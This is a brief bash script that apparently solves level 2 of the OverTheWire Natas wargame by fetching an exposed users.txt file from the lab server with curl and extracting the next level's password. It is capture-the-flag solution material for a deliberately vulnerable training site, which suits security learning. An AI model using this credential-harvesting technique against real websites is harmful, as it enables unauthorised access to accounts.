#/bin/bash
url="http://natas2.natas.labs.overthewire.org"
user="natas2"
pass=$(cat credentials/natas2)

curl -s -u "$user:$pass" "$url/files/users.txt" | grep natas3 | awk -F ":" '{print $2}'
